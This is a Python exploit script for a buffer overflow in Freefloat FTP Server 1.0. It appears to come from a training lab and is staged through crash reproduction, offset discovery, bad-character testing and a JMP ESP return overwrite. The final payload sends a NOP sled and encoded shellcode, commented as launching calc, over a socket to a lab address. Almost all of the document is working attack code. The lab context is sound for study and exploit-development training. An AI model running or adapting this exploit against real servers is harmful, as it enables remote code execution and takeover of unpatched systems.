#!/usr/bin/python

import socket
import sys

# Freefloat FTP Server 1.0
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/40673
# Exploit tested on Windows XP Pro SP3 FR
# Note: other FTP commands are vulnerable to buffer overflow (https://www.exploit-db.com/search?q=freefloat)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.0.2.4',2121))

#Pop a calc
shellcode=  b""
shellcode+= b"\xdb\xc1\xbf\x58\x10\xeb\x54\xd9\x74\x24\xf4\x5d\x33"
shellcode+= b"\xc9\xb1\x31\x31\x7d\x18\x03\x7d\x18\x83\xc5\x5c\xf2"
shellcode+= b"\x1e\xa8\xb4\x70\xe0\x51\x44\x15\x68\xb4\x75\x15\x0e"
shellcode+= b"\xbc\x25\xa5\x44\x90\xc9\x4e\x08\x01\x5a\x22\x85\x26"
shellcode+= b"\xeb\x89\xf3\x09\xec\xa2\xc0\x08\x6e\xb9\x14\xeb\x4f"
shellcode+= b"\x72\x69\xea\x88\x6f\x80\xbe\x41\xfb\x37\x2f\xe6\xb1"
shellcode+= b"\x8b\xc4\xb4\x54\x8c\x39\x0c\x56\xbd\xef\x07\x01\x1d"
shellcode+= b"\x11\xc4\x39\x14\x09\x09\x07\xee\xa2\xf9\xf3\xf1\x62"
shellcode+= b"\x30\xfb\x5e\x4b\xfd\x0e\x9e\x8b\x39\xf1\xd5\xe5\x3a"
shellcode+= b"\x8c\xed\x31\x41\x4a\x7b\xa2\xe1\x19\xdb\x0e\x10\xcd"
shellcode+= b"\xba\xc5\x1e\xba\xc9\x82\x02\x3d\x1d\xb9\x3e\xb6\xa0"
shellcode+= b"\x6e\xb7\x8c\x86\xaa\x9c\x57\xa6\xeb\x78\x39\xd7\xec"
shellcode+= b"\x23\xe6\x7d\x66\xc9\xf3\x0f\x25\x87\x02\x9d\x53\xe5"
shellcode+= b"\x05\x9d\x5b\x59\x6e\xac\xd0\x36\xe9\x31\x33\x73\x05"
shellcode+= b"\x78\x1e\xd5\x8e\x25\xca\x64\xd3\xd5\x20\xaa\xea\x55"
shellcode+= b"\xc1\x52\x09\x45\xa0\x57\x55\xc1\x58\x25\xc6\xa4\x5e"
shellcode+= b"\x9a\xe7\xec\x3c\x7d\x74\x6c\xed\x18\xfc\x17\xf1"

#Step 1: Replicate the crash
buffer = b"A"*500

#Step 2: Find the offset
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
buffer = b"A"*251 + b"BBBB" + b"C"*500

#Step 4: Find the bad chars (\x00, \0x0a, \x0d)
badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buffer = b"A"*251 + b"BBBB" + badchars


#Step 5: Exploit test
ret = b"\xd7\x30\x9e\x7c" #7C9E30D7 (JMP ESP)
buffer = b"A"*251 + ret + b"\x90"*20 + b"\xCC" + shellcode

#Step 5bis: Exploit
buffer = b"A"*251 + ret + b"\x90"*20 + shellcode

s.recv(1500)
s.send(buffer + b"\r\n")
s.close()
